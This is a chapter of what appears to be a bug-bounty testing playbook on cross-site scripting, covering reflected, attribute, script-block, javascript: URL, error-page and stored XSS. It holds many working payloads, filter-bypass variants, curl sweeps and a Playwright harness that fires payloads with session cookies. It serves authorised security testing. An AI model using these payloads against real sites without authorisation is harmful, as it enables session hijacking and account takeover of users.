# XSS · Cross-site scripting

> Data you control is parsed as markup or code in a page of the target's origin, in someone else's browser. It
> pays when that script runs in a victim's authenticated session on an origin that holds something worth taking:
> the session, a CSRF token, an API key, the e-mail-change form. Markup that does not execute, script that runs
> only in your own session, and script on a cookieless sandbox origin are primitives or nothing.

| | |
|---|---|
| **Class** | `xss` |
| **Applies when** | http, app |
| **Pays** | 2,640 disclosed reports, 569 paid, median $500, top $16,000. The best-paid ones were stored XSS in a Markdown or rich-text pipeline, or in a field that staff read, on the main application origin; reflected XSS topped out at $5,000. |
| **Weaknesses** | Cross-site Scripting (XSS) - Reflected · Cross-site Scripting (XSS) - Stored · Cross-site Scripting (XSS) - DOM · Cross-site Scripting (XSS) - Generic · CWE-79, CWE-80 |

## Why it pays

XSS is the largest class in the library and the most uneven. The $500 median is the price of a reflected XSS on
a host that holds little, and 253 of the reports went to the U.S. Dept Of Defense programme, which paid for none
of them. The top of the table is a different bug in the same class:

- **Stored, in a rendering pipeline.** A Markdown filter (#1212067, $16,000), a diagram renderer (#1731349,
  $13,950), contact name fields reaching a new command renderer (#1578400, $13,950), a rich-text parser
  (#1930763, $5,000). The framework escapes by default; the bug is in code that builds HTML by hand after the
  escaping step.
- **Blind, in a staff tool.** A name or a ticket field that an employee opens in a back office (#135154, $5,000;
  #948929, $3,000).
- **Reflected or DOM, on a host that holds the session.** A redirect parameter on an accounts host (#1962645,
  $5,000), a `postMessage` listener on every shop (#231053, $3,000) or on a login page (#603764, $2,500).
- **Uploaded.** An SVG that the application accepts and renders (#232174, $5,000; #1276742, $5,300).

What separates $500 from $5,000 is the origin and the demonstrated impact. `docs/06-severity.md` scores a
reflected XSS at 6.1, a stored XSS that hits other users at 5.4, and a stored XSS with a shown administrator
takeover at 9.0. An `alert` proves execution. XSS-018 is the item that moves the report up: #397497 and #723060
are both titled as escalations to account takeover.

Auto-escaping template engines and component frameworks removed the easy version of this bug. What is left sits
in four places: where a developer opted out of escaping (`|safe`, `raw`, `html_safe`, `dangerouslySetInnerHTML`,
`v-html`), in second renderers (tooltips, notifications, e-mail previews, exports), in client-side sinks fed from
the URL or from `postMessage`, and in sanitisers whose parser disagrees with the browser's.

## The crux question

**Where does a string I control reach a browser as markup or code, on an origin that holds a victim's session,
and what exactly does the parser see at that point?**

Context decides the payload. Find the context first, then send the one payload that fits it:

| The marker lands | First payload | Item |
|---|---|---|
| between tags | `<svg onload=alert(document.domain)>` | XSS-001 |
| inside `<title>`, `<textarea>`, `<style>`, `<noscript>` or a comment | close that element, then the same | XSS-001 |
| in a quoted or unquoted attribute value | `" autofocus onfocus=alert(document.domain) x="` | XSS-002 |
| in a `style` attribute or a CSS value, quote encoded | none: CSS does not run script in current browsers | XSS-002 |
| in a JavaScript string inside a script block | `'-alert(document.domain)-'` or `</script><svg onload=…>` | XSS-003 |
| in `href`, `src`, `action` or a client-side navigation | `javascript:alert(document.domain)` | XSS-004 |
| in the path of a 404 or in an error message | as the context above, percent-encoded as a browser sends it | XSS-005 |
| only in the DOM, after script has run | fitted to the sink | XSS-013, XSS-014 |
| in a file or a response whose content type you influence | an SVG, HTML or XML document | XSS-009, XSS-010 |

## Applicability probe

The chapter gate (`http`, `app`) comes from the fingerprint. Settle `reflect`, `user-content`, `rich-text`,
`upload` and `postmessage` for the asset before opening any item; note `waf`, `spa` and `redirect-param` while
you are there.

```bash
M="xssq$RANDOM"
# 1. Reflection: every parameterised URL from the crawl, each value replaced by a marker and < " ' >
grep -hoE "https?://$H/[^\"' <>]*\?[^\"' <>#]+" "$E/recon/$H/"*.txt | sort -u | head -150 | while read -r u; do
  p=$(printf '%s' "$u" | sed -E "s/=[^&]*/=$M%3C%22%27%3E/g")
  n=$(curl -sS "${HDR[@]}" "$p" | grep -a -c "$M"); [ "$n" -gt 0 ] && echo "$n $p"
  sleep "$(awk "BEGIN{print 1/$RATE}")"; done | tee "$E/recon/$H/reflect.txt"
# 2. The path and the error page are inputs too
curl -sS "${HDR[@]}" -w '\n%{http_code} %{content_type}\n' "$T/$M%3Cx%3E" | grep -a -E "$M|^[0-9]{3} "
# 3. Client-side sinks and message listeners in the bundles
grep -rnoE '.{0,60}(\.innerHTML\s*=|\.outerHTML\s*=|insertAdjacentHTML|document\.write(ln)?\(|dangerouslySetInnerHTML|v-html|bypassSecurityTrustHtml|\{@html|\.html\(|eval\(|new Function\()' \
  "$E/recon/$H/js/" | cut -c1-200 | head -40
grep -rlE 'addEventListener\(\s*["'"'"']message|\.onmessage\s*=' "$E/recon/$H/js/"
# 4. What the browser is told: policy, sniffing, cookie flags
curl -sS "${HDR[@]}" -D- -o /dev/null "$T/" | grep -iE '^(content-security-policy|x-content-type-options|set-cookie)'
```

Then walk the authenticated application once with both accounts and write down: every field A fills that B, an
administrator or support staff later sees; every editor that accepts markup; every upload and the host its files
are served from; every support, feedback or sign-up form whose content lands in a tool you cannot see.

```bash
scripts/sane fact set "$H" reflect=1 --ev "q on /search returned raw inside a value attribute; unknown path echoed in the 404 body"
scripts/sane fact set "$H" user-content=1 rich-text=1 --ev "display name shown to teammates; Markdown comments on tickets"
scripts/sane fact set "$H" upload=1 --ev "avatar and ticket attachments, served from the application host under /uploads/"
scripts/sane fact set "$H" postmessage=1 --ev "message listener in app.9f3c.js"
# nothing after the sweep and the walk:
scripts/sane fact set "$H" reflect=0 user-content=0 rich-text=0 upload=0 postmessage=0 \
  --ev "marker not returned for 150 parameterised URLs, the path or the 404 page; no field is shown to another account or to staff; no upload; no message listener in the bundles"
```

With those false the planner closes the reflected, stored, upload and `postMessage` items for the asset. XSS-005,
XSS-012, XSS-013 and XSS-016 need only a capability and stay queued, and XSS-004 stays while `redirect-param` or
`spa` is true: they are cheap, so run them and record `negative` with the mechanism. XSS-015 and XSS-017 are
worked only when another item has an injection to unblock, and XSS-018 only when one executes. When the asset
turns out not to be an application at all (static pages, no input reaches a response), set `app=0` with that
evidence and the chapter closes.

## Triage order

XSS-001 → XSS-002 → XSS-003 → XSS-004 (the reflections the probe listed, each by its context) → XSS-005 (error
pages, ten requests) → XSS-011 → XSS-012 (plant the blind payloads on the first day; they fire days later) →
XSS-013 → XSS-014 (bundle grep, no account needed) → XSS-006 → XSS-007 (stored, the highest ceiling) → XSS-009 →
XSS-010 (uploads and content types) → XSS-008 (sanitiser work, expensive) → XSS-016 (cookies). XSS-017 and
XSS-015 are opened when a WAF or the policy stops a payload that would otherwise run. XSS-018 follows every item
that executes.

## Items

### XSS-001 · A reflected parameter is written between HTML tags unencoded and runs as markup

| | |
|---|---|
| **Severity** | Medium standalone; High with XSS-018 when the script takes over our victim account |
| **Requires** | reflect, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Cross-site Scripting (XSS) - Reflected · CWE-79 |
| **Prior art** | #2352968, #1549206, #1378413, #125027 |

- **Where:** every parameter in `$E/recon/$H/reflect.txt` whose marker sits in a text position of an HTML
  response: search and filter boxes, `message=`, `error=` and `msg=` banners, pagination and sort values, form
  fields shown again after a validation error, tracking parameters copied into the page. Include POST bodies and
  path segments.
- **Test:** send a marker with `<`, `>`, `"` and `'`, and read which arrive unencoded and what encloses them. A raw
  `<` in a text position is enough: the parser builds whatever element you send. Inside `<title>`, `<textarea>`,
  `<style>`, `<xmp>`, `<noscript>` or a comment, the enclosing element has to be closed first.
- **How:**
  ```bash
  D="$E/evidence/$H/XSS-001"; mkdir -p "$D"
  # 1. which characters come back raw, and what encloses the marker (example: q on /search)
  curl -sS "${HDR[@]}" --get --data-urlencode "q=xss001<>\"'" "$T/search" | grep -a -o ".\{80\}xss001.\{12\}"
  # 2. payload by enclosing context
  #    text between tags                           <svg onload=alert(document.domain)>
  #    inside title, textarea, style, xmp, noscript   </title><svg onload=alert(document.domain)>
  #    inside an HTML comment                      --><svg onload=alert(document.domain)>
  #    tags kept, on* attributes removed           <script>alert(document.domain)</script>
  #                                                <iframe srcdoc="<script>alert(document.domain)</script>">
  #    < encoded, but the page runs AngularJS 1.x (ng-app)   {{constructor.constructor('alert(document.domain)')()}}
  P='<svg onload=alert(document.domain)>'
  URL=$(curl -sS "${HDR[@]}" -o "$D/response.html" -w '%{url_effective}' --get --data-urlencode "q=$P" "$T/search")
  grep -a -c 'onload=alert(document.domain)>' "$D/response.html"; echo "$URL" > "$D/url.txt"
  # 3. the browser decides: it encodes the URL the way a victim's browser does
  cat > "$D/fire.js" <<'JS'
  // usage: fire.js <url> <evidence dir> <account .headers file, or - for logged out> <the HDR arguments>
  const { chromium } = require('playwright'), fs = require('fs');
  (async () => {
    const [url, dir, acct, ...h] = process.argv.slice(2), hd = {}; let ua;
    for (let i = 0; i + 1 < h.length; i += 2) h[i] === '-A' ? ua = h[i + 1] : hd[h[i + 1].split(':')[0]] = h[i + 1].replace(/^[^:]*:\s*/, '');
    const b = await chromium.launch(), c = await b.newContext({ userAgent: ua, extraHTTPHeaders: hd }), p = await c.newPage();
    if (acct !== '-') await c.addCookies((fs.readFileSync(acct, 'utf8').match(/^cookie:\s*(.*)$/im) || [, ''])[1].split(/;\s*/)
      .filter(x => x.includes('=')).map(x => ({ name: x.split('=')[0], value: x.slice(x.indexOf('=') + 1), url: new URL(url).origin })));
    p.on('dialog', async m => { fs.appendFileSync(`${dir}/dialog.txt`, `${p.url()} -> ${m.message()}\n`); await m.accept(); });
    await p.goto(url); await p.waitForTimeout(4000);
    await p.screenshot({ path: `${dir}/page-${Date.now()}.png`, fullPage: true }); await b.close();
  })();
  JS
  NODE_PATH="$(npm root -g)" node "$D/fire.js" "$URL" "$D" - "${HDR[@]}"; cat "$D/dialog.txt"   # expect: <url> -> $H
  ```
  When the reflecting page needs a login, pass `"$E/accounts/B.headers"` instead of `-`. A POST reflection is
  delivered by an auto-submitting form on another origin
  (`<form method=POST action="$T/search"><input name=q value="…"></form><script>document.forms[0].submit()</script>`).
- **Proof:** `dialog.txt` showing the target URL and the message `$H`, the screenshot, `response.html` with the
  payload unencoded, and the one link (or the form page) a victim opens. State whether the victim must be
  logged in.
- **Not a finding when:** the raw `<` exists only in `curl` output: a browser percent-encodes `<`, `>` and `"` in
  the query and the page prints `%3C`. The response is `application/json` or `text/plain` (not rendered: XSS-010),
  or a 3xx whose body is never shown. The reflection needs a POST carrying a CSRF token, a custom header or a
  JSON body that a cross-site form cannot send, so only the victim can fire it (`self-xss`). Tags come back but
  handlers and `<script>` are stripped and nothing runs: that is HTML injection (`content-spoofing`). The dialog
  names a sandbox or user-content host that holds no session.
- **Escalate:** XSS-018 for impact. A 403 on the payload while the marker passes is XSS-017; a silent page with a
  policy violation in the console is XSS-015. If the response is stored by a shared cache, the same URL becomes
  stored XSS for every visitor: CCH items.

### XSS-002 · A reflected parameter breaks out of an HTML attribute value and adds an event handler

| | |
|---|---|
| **Severity** | Medium standalone; High with XSS-018; Low when the only handler that fits needs a key press or a hover |
| **Requires** | reflect, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Cross-site Scripting (XSS) - Reflected · CWE-79 |
| **Prior art** | #203974, #504984, #263226, #139981 |

- **Where:** reflections in `$E/recon/$H/reflect.txt` that sit inside a tag: `value="…"` of a search or form
  field, hidden inputs that carry state between steps, `content="…"` of meta tags, `href` of canonical and
  alternate links, `data-*` attributes, `title` and `placeholder`, an existing `onclick="…"`, a `style="…"`.
- **Test:** identify the delimiter (double quote, single quote, none) and check whether that delimiter comes back
  raw. If it does, the value ends where you say and the rest is new attributes; `<` and `>` are not needed. Pick
  a handler that fires without interaction on that element. A value inside an existing event handler or inside
  `srcdoc` is entity-decoded before it is used, so HTML encoding does not protect it.
- **How:**
  ```bash
  D="$E/evidence/$H/XSS-002"; mkdir -p "$D"
  curl -sS "${HDR[@]}" --get --data-urlencode "q=xss002\"'<> x=y" "$T/search" | grep -a -o ".\{90\}xss002.\{24\}"
  #    value="xss002…" and " is raw          " autofocus onfocus=alert(document.domain) x="
  #    value='xss002…' and ' is raw          ' autofocus onfocus=alert(document.domain) x='
  #    value=xss002… (no quotes)             x autofocus onfocus=alert(document.domain)
  #    element that ignores autofocus (div, span, a)
  #                                          " id=x002 tabindex=0 onfocus=alert(document.domain) x="   plus #x002 on the URL
  #    < and > are raw as well               "><svg onload=alert(document.domain)>
  #    <input type=hidden>, value before type   " type=text autofocus onfocus=alert(document.domain) x="   (first type wins)
  #    <input type=hidden>, type before value, and meta or link tags
  #                                          " accesskey=x onclick=alert(document.domain) x="   (needs a key press)
  #    inside onclick="f('xss002')"          ');alert(document.domain);//   also as &#39;);alert(document.domain);//
  #    inside srcdoc="…"                     &lt;svg onload=alert(document.domain)&gt;
  #    inside style="…", quote encoded       no script in current browsers: record CSS injection and stop
  P='" autofocus onfocus=alert(document.domain) x="'
  URL=$(curl -sS "${HDR[@]}" -o "$D/response.html" -w '%{url_effective}' --get --data-urlencode "q=$P" "$T/search")
  grep -a -o '.\{60\}onfocus=alert(document.domain).\{8\}' "$D/response.html"
  cat > "$D/fire.js" <<'JS'
  // usage: fire.js <url> <evidence dir> <account .headers file, or - for logged out> <the HDR arguments>
  const { chromium } = require('playwright'), fs = require('fs');
  (async () => {
    const [url, dir, acct, ...h] = process.argv.slice(2), hd = {}; let ua;
    for (let i = 0; i + 1 < h.length; i += 2) h[i] === '-A' ? ua = h[i + 1] : hd[h[i + 1].split(':')[0]] = h[i + 1].replace(/^[^:]*:\s*/, '');
    const b = await chromium.launch(), c = await b.newContext({ userAgent: ua, extraHTTPHeaders: hd }), p = await c.newPage();
    if (acct !== '-') await c.addCookies((fs.readFileSync(acct, 'utf8').match(/^cookie:\s*(.*)$/im) || [, ''])[1].split(/;\s*/)
      .filter(x => x.includes('=')).map(x => ({ name: x.split('=')[0], value: x.slice(x.indexOf('=') + 1), url: new URL(url).origin })));
    p.on('dialog', async m => { fs.appendFileSync(`${dir}/dialog.txt`, `${p.url()} -> ${m.message()}\n`); await m.accept(); });
    await p.goto(url); await p.waitForTimeout(4000);
    await p.screenshot({ path: `${dir}/page-${Date.now()}.png`, fullPage: true }); await b.close();
  })();
  JS
  NODE_PATH="$(npm root -g)" node "$D/fire.js" "$URL" "$D" - "${HDR[@]}"; cat "$D/dialog.txt"   # for the tabindex form: "$URL#x002"
  ```
- **Proof:** `dialog.txt` with the target URL and `$H`, the response excerpt showing the injected attribute inside
  the original tag, the screenshot, and the link. Name the interaction: none (`autofocus`, URL fragment) or which
  one.
- **Not a finding when:** the delimiter is returned as `&quot;` or `&#39;` (encoded: the value cannot end). Another
  element on the page already holds `autofocus`, so yours never receives focus: use the `id` plus URL-fragment
  form before calling it negative. The only working form is `accesskey` plus `onclick`, or a hover: most policies
  file that under XSS that needs unlikely interaction (`self-xss`). The value is in a `style` attribute with the
  quote encoded: `expression()` and `url(javascript:)` are dead, and what remains is CSS injection, closed as
  `content-spoofing` unless a selector-based leak of a token on that page is demonstrated.
- **Escalate:** XSS-018. A handler blocked by `script-src` without `'unsafe-inline'` goes to XSS-015. An attribute
  injection that cannot run script can still add `formaction`, `href` or `ping` to an existing element: note it
  for CSR items.

### XSS-003 · A reflected parameter lands inside a script block and ends the string or the script element

| | |
|---|---|
| **Severity** | Medium standalone; High with XSS-018 |
| **Requires** | reflect, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Cross-site Scripting (XSS) - Reflected · CWE-79 |
| **Prior art** | #520630, #507132, #344112, #2888784 |

- **Where:** reflections between `<script>` and `</script>`: analytics and tag-manager snippets that copy the
  page URL, search term or user id; `var config = {…}` and `window.__INITIAL_STATE__ = {…}` blobs; JSON inside
  `<script type="application/json">`; inline handlers that build a call from a parameter.
- **Test:** there are four ways out and each has its own defence. The string delimiter is not escaped. The
  delimiter is escaped with a backslash but a backslash you send is not. `</script>` is not encoded, and the HTML
  parser ends the element whatever the JavaScript string state is. The value sits in a template literal, where
  `${…}` evaluates. Code injected inside an existing script block runs under that block's nonce, so a policy
  without `'unsafe-inline'` does not stop the first, second and fourth forms.
- **How:**
  ```bash
  D="$E/evidence/$H/XSS-003"; mkdir -p "$D"
  curl -sS "${HDR[@]}" --get --data-urlencode "q=xss003'\"\\\`</script>" "$T/search" | grep -a -o ".\{100\}xss003.\{30\}"
  #    var q = 'xss003';   ' is raw                  '-alert(document.domain)-'
  #    var q = "xss003";   " is raw                  "-alert(document.domain)-"
  #    ' becomes \' and \ stays \                    \'-alert(document.domain)//
  #    </script> is raw (any of the above escaped)   </script><svg onload=alert(document.domain)>
  #    q = `xss003` (template literal)               ${alert(document.domain)}
  #    not quoted: var page = xss003;                1;alert(document.domain)
  #    JSON blob, < not written as <            </script><svg onload=alert(document.domain)>
  P="'-alert(document.domain)-'"
  URL=$(curl -sS "${HDR[@]}" -o "$D/response.html" -w '%{url_effective}' --get --data-urlencode "q=$P" "$T/search")
  grep -a -o '.\{60\}alert(document.domain).\{20\}' "$D/response.html"
  cat > "$D/fire.js" <<'JS'
  // usage: fire.js <url> <evidence dir> <account .headers file, or - for logged out> <the HDR arguments>
  const { chromium } = require('playwright'), fs = require('fs');
  (async () => {
    const [url, dir, acct, ...h] = process.argv.slice(2), hd = {}; let ua;
    for (let i = 0; i + 1 < h.length; i += 2) h[i] === '-A' ? ua = h[i + 1] : hd[h[i + 1].split(':')[0]] = h[i + 1].replace(/^[^:]*:\s*/, '');
    const b = await chromium.launch(), c = await b.newContext({ userAgent: ua, extraHTTPHeaders: hd }), p = await c.newPage();
    if (acct !== '-') await c.addCookies((fs.readFileSync(acct, 'utf8').match(/^cookie:\s*(.*)$/im) || [, ''])[1].split(/;\s*/)
      .filter(x => x.includes('=')).map(x => ({ name: x.split('=')[0], value: x.slice(x.indexOf('=') + 1), url: new URL(url).origin })));
    p.on('dialog', async m => { fs.appendFileSync(`${dir}/dialog.txt`, `${p.url()} -> ${m.message()}\n`); await m.accept(); });
    p.on('pageerror', e => fs.appendFileSync(`${dir}/jserrors.txt`, e.message + '\n'));
    await p.goto(url); await p.waitForTimeout(4000);
    await p.screenshot({ path: `${dir}/page-${Date.now()}.png`, fullPage: true }); await b.close();
  })();
  JS
  NODE_PATH="$(npm root -g)" node "$D/fire.js" "$URL" "$D" - "${HDR[@]}"; cat "$D/dialog.txt" "$D/jserrors.txt"
  ```
  A `SyntaxError` in `jserrors.txt` means the breakout worked and the remainder of the line no longer parses:
  end the payload with `//`, or balance the brackets, before recording a negative.
- **Proof:** `dialog.txt` with the target URL and `$H`, the script-block excerpt showing where the string ends and
  your code begins, the screenshot, and the link.
- **Not a finding when:** the quote, the backslash and `<` are all escaped (`\'`, `\\`, `<`): the value stays
  data. The response is `application/javascript` or `application/json`: a callback name echoed in a script
  response is not XSS by itself (it is a gadget for XSS-015). The payload reaches the block but the block is
  never executed (`type="text/template"`, or JSON that is only passed to `JSON.parse`) and `</script>` is encoded.
- **Escalate:** XSS-018. When only `</script>` works and the policy blocks the new element, go to XSS-015. The
  same blob is often built from stored fields too: repeat the test with XSS-006 data.

### XSS-004 · A parameter used as a link target or navigation destination accepts a javascript: URL

| | |
|---|---|
| **Severity** | Medium standalone; High with XSS-018, which is the usual case on a login or OAuth page |
| **Requires** | reflect\|redirect-param\|spa, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Cross-site Scripting (XSS) - Generic · CWE-79 |
| **Prior art** | #1962645, #125791, #683298, #996303 |

- **Where:** `next`, `return_to`, `redirect`, `redirect_uri`, `back_url`, `continue`, `dest`, `url` and similar
  parameters whose value is written into `<a href>` ("Continue", "Back to the site"), `<form action>`,
  `<iframe src>`, or handed by front-end code to `location.href`, `location.assign`, `location.replace`,
  `window.open` or a router's `push`. Login, logout, OAuth consent, e-mail confirmation and interstitial
  "you are leaving" pages are the usual places.
- **Test:** the value is checked as a destination (same host, allowed path) but its scheme is not. A
  `javascript:` URL in an `href` runs in the page's origin when clicked; assigned to `location` by script it runs
  with no click. Filters are passed with case changes, with tab or newline characters that the URL parser
  removes, or with `javascript://host/%0a…`, which satisfies a host check while the `//` opens a comment that
  the encoded newline closes.
- **How:**
  ```bash
  D="$E/evidence/$H/XSS-004"; mkdir -p "$D"
  # server-rendered: where does the value land?
  curl -sS "${HDR[@]}" --get --data-urlencode 'next=javascript:alert(document.domain)//xss004' "$T/login" \
    | grep -a -i -o '.\{70\}alert(document.domain).\{20\}'
  # client-side: which code moves a parameter into a navigation?
  grep -rnoE '.{0,90}(location\.(href|assign|replace)|window\.open|router\.(push|replace)|navigate)[^;]{0,90}' "$E/recon/$H/js/" \
    | grep -iE 'next|return|redirect|continue|dest|back|url' | cut -c1-260 | head -20
  #    refused as written?                JaVaScRiPt:alert(document.domain)
  #                                       %09javascript:alert(document.domain)      java%0ascript:alert(document.domain)
  #    must contain the host or //        javascript://HOST/%0aalert(document.domain)    (HOST = the name the check wants)
  #    must end with an allowed URL       javascript:alert(document.domain)//https://HOST/
  URL=$(curl -sS "${HDR[@]}" -o "$D/response.html" -w '%{url_effective}' --get \
    --data-urlencode 'next=javascript:alert(document.domain)' "$T/login")
  cat > "$D/fire.js" <<'JS'
  // usage: fire.js <url> <evidence dir> <account .headers file, or - for logged out> <the HDR arguments>
  const { chromium } = require('playwright'), fs = require('fs');
  (async () => {
    const [url, dir, acct, ...h] = process.argv.slice(2), hd = {}; let ua;
    for (let i = 0; i + 1 < h.length; i += 2) h[i] === '-A' ? ua = h[i + 1] : hd[h[i + 1].split(':')[0]] = h[i + 1].replace(/^[^:]*:\s*/, '');
    const b = await chromium.launch(), c = await b.newContext({ userAgent: ua, extraHTTPHeaders: hd }), p = await c.newPage();
    if (acct !== '-') await c.addCookies((fs.readFileSync(acct, 'utf8').match(/^cookie:\s*(.*)$/im) || [, ''])[1].split(/;\s*/)
      .filter(x => x.includes('=')).map(x => ({ name: x.split('=')[0], value: x.slice(x.indexOf('=') + 1), url: new URL(url).origin })));
    p.on('dialog', async m => { fs.appendFileSync(`${dir}/dialog.txt`, `${p.url()} -> ${m.message()}\n`); await m.accept(); });
    await p.goto(url); await p.waitForTimeout(3000);
    fs.writeFileSync(`${dir}/links.txt`, (await p.$$eval('[href],[action],[src]', e => e.map(x => x.outerHTML.slice(0, 200)))).filter(x => /script:/i.test(x)).join('\n'));
    await p.locator('[href*="alert(document.domain)"]').first().click({ timeout: 3000 }).catch(() => {});   // one click, when it is a link
    await p.waitForTimeout(2000); await p.screenshot({ path: `${dir}/page-${Date.now()}.png`, fullPage: true }); await b.close();
  })();
  JS
  NODE_PATH="$(npm root -g)" node "$D/fire.js" "$URL" "$D" - "${HDR[@]}"; cat "$D/links.txt" "$D/dialog.txt"
  ```
  A redirect that only happens for a logged-in user is tested with `"$E/accounts/B.headers"` in place of `-`.
- **Proof:** `dialog.txt` with the target URL and `$H`; `links.txt` (the rendered element) or the bundle line that
  assigns the parameter to `location`; the link the victim opens and the number of clicks after it (zero or one).
- **Not a finding when:** the server answers `302` with `Location: javascript:…`: browsers do not follow it and
  nothing runs. The destination is a `data:` URL: it runs in an opaque origin, not in the target's. The rendered
  `href` in `links.txt` is not what you sent: Angular writes `unsafe:javascript:…` and recent React replaces the
  URL with a stub that throws. Only `https://other-host/` is accepted and no script scheme: that is an open
  redirect (`open-redirect`), an RDR item.
- **Escalate:** XSS-018. On an OAuth authorisation page, script in that origin can approve a consent or read the
  code: OAU items. A user-supplied "website" or "link" field with the same missing scheme check is the stored
  form: XSS-006 and XSS-007.

### XSS-005 · The 404 or error page writes the requested path or a rejected value into HTML unencoded

| | |
|---|---|
| **Severity** | Medium standalone; High with XSS-018 |
| **Requires** | browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Cross-site Scripting (XSS) - Reflected · CWE-79 |
| **Prior art** | #216812, #406704, #716761, #125130 |

- **Where:** no asset fact gates this item: the `reflect` probe exercises parameters of working routes, and error
  handlers are separate templates, often older than the application and outside its auto-escaping. Aim at an
  unknown path, an unknown path under each prefix that a different tier serves (`/api/`, `/static/`, a `.php`,
  `.jsp` or `.aspx` suffix), a wrong type in a typed parameter (`id=abc`, `page[]=1`), a malformed escape
  (`%zz`), and any "the page X was not found" or "invalid value X" message. The 404 page's analytics snippet
  often copies the path into a JavaScript string.
- **Test:** send each input percent-encoded exactly as a browser would, and look for the decoded value in an HTML
  response. The handler has to decode before it prints; a page that prints `%3C` is safe.
- **How:**
  ```bash
  D="$E/evidence/$H/XSS-005"; mkdir -p "$D"; M=xss005
  while read -r u; do
    f="$D/$(printf '%s' "$u" | md5sum | cut -c1-8).html"
    curl -sS "${HDR[@]}" --path-as-is -o "$f" -w '%{http_code} %{content_type}' "$T$u"; echo "  $u"
    grep -a -o ".\{70\}$M.\{40\}" "$f" | head -3; sleep 1
  done <<EOF
  /$M%3Cx%3E%22
  /$M'-x-'
  /$M%3Cx%3E.php
  /$M%3Cx%3E.jsp
  /api/$M%3Cx%3E
  /static/$M%3Cx%3E.js
  /%zz$M%3Cx%3E
  /?id=$M%3Cx%3E&page[]=$M%3Cx%3E
  EOF
  #    <x> decoded, between tags, text/html      /%3Csvg%20onload=alert(document.domain)%3E
  #    path inside a JavaScript string, ' raw    /'-alert(document.domain)-'      (browsers do not encode ' ( ) in a path)
  #    inside an attribute, " decoded            /%22%20autofocus%20onfocus=alert(document.domain)%20x=%22
  URL="$T/%3Csvg%20onload=alert(document.domain)%3E"
  cat > "$D/fire.js" <<'JS'
  // usage: fire.js <url> <evidence dir> <account .headers file, or - for logged out> <the HDR arguments>
  const { chromium } = require('playwright'), fs = require('fs');
  (async () => {
    const [url, dir, acct, ...h] = process.argv.slice(2), hd = {}; let ua;
    for (let i = 0; i + 1 < h.length; i += 2) h[i] === '-A' ? ua = h[i + 1] : hd[h[i + 1].split(':')[0]] = h[i + 1].replace(/^[^:]*:\s*/, '');
    const b = await chromium.launch(), c = await b.newContext({ userAgent: ua, extraHTTPHeaders: hd }), p = await c.newPage();
    if (acct !== '-') await c.addCookies((fs.readFileSync(acct, 'utf8').match(/^cookie:\s*(.*)$/im) || [, ''])[1].split(/;\s*/)
      .filter(x => x.includes('=')).map(x => ({ name: x.split('=')[0], value: x.slice(x.indexOf('=') + 1), url: new URL(url).origin })));
    p.on('dialog', async m => { fs.appendFileSync(`${dir}/dialog.txt`, `${p.url()} -> ${m.message()}\n`); await m.accept(); });
    await p.goto(url); await p.waitForTimeout(4000);
    await p.screenshot({ path: `${dir}/page-${Date.now()}.png`, fullPage: true }); await b.close();
  })();
  JS
  NODE_PATH="$(npm root -g)" node "$D/fire.js" "$URL" "$D" - "${HDR[@]}"; cat "$D/dialog.txt"
  ```
- **Proof:** `dialog.txt` with the error URL and `$H`, the saved error response with its status line and
  `Content-Type: text/html`, the screenshot, and the link.
- **Not a finding when:** the page prints the value still percent-encoded. The error body is `application/json`
  or `text/plain`. The raw `<` appears only when `curl` sends it unencoded, which no browser does. The page
  belongs to the CDN or to the object store (an XML `NoSuchKey` answer, an edge "reference number" page): that is
  another origin's template (`third-party`). The reflected input is the request method or a header, which a
  cross-site page cannot set for the victim. A stack trace or debug page without script execution is
  `version-disclosure`.
- **Escalate:** XSS-018. Error pages frequently lack the `Content-Security-Policy` the rest of the origin sends,
  which makes them the place to move an injection that XSS-015 could not unblock. A cacheable error response is a
  CCH item.

### XSS-006 · A plain-text field saved by one account runs as script when another account views it

| | |
|---|---|
| **Severity** | Medium standalone; High when the viewer is an administrator or staff role, or with XSS-018 |
| **Requires** | user-content, two-accounts, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Cross-site Scripting (XSS) - Stored · CWE-79 |
| **Prior art** | #1578400, #348076, #3988961, #388506 |

- **Where:** every field A fills that B sees: display, first and last name, organisation, team and project
  names, job title, address, labels and tags, custom-field names, API-key and device names, invitation text,
  and the file name of every upload (the multipart `filename` is validated separately from form fields, or not
  at all). Then every place each value is rendered: profile and member list, mention and autocomplete
  drop-downs, search results, activity feed, notification bell and toast, tooltips, breadcrumbs, the page
  `<title>`, chart labels, print and export views, the "view this e-mail in a browser" page. The main list is
  usually escaped by the framework; the bug is in the second renderer.
- **Test:** save a marker with `"`, `'` and a harmless tag through the API, not the form. As B, find each place
  it appears and its context, then save the payload that fits that context and load the page as B in the browser.
- **How:**
  ```bash
  D="$E/evidence/$H/XSS-006"; mkdir -p "$D"
  # 1. as A: a marker in every field, sent to the API directly (client-side validation is not a control)
  curl -sS "${HDR[@]}" $A -X PATCH "$T/api/v1/me" -H 'Content-Type: application/json' -D "$D/save.txt" -o /dev/null --data-binary @- <<'EOF'
  {"display_name":"xss006a\"'<i>","company":"xss006b\"'<i>","bio":"xss006c\"'<i>"}
  EOF
  # a file name is its own input: build the part by hand so quotes and brackets arrive unchanged
  python3 -c "import base64,sys; sys.stdout.buffer.write(base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg=='))" > "$D/x.png"
  { printf -- '--xb\r\nContent-Disposition: form-data; name="file"; filename="xss006d%s<i>.png"\r\nContent-Type: image/png\r\n\r\n' "'"
    cat "$D/x.png"; printf '\r\n--xb--\r\n'; } > "$D/upload.bin"
  curl -sS "${HDR[@]}" $A -X POST "$T/api/v1/attachments" -H 'Content-Type: multipart/form-data; boundary=xb' --data-binary @"$D/upload.bin"
  # 2. as B: where does each marker come back, and in which context?
  for u in "$T/team/members" "$T/users/1042" "$T/activity" "$T/notifications" "$T/search?q=xss006"; do
    echo "== $u"; curl -sS "${HDR[@]}" $B "$u" | grep -a -o ".\{70\}xss006[a-d].\{14\}"; sleep 1; done
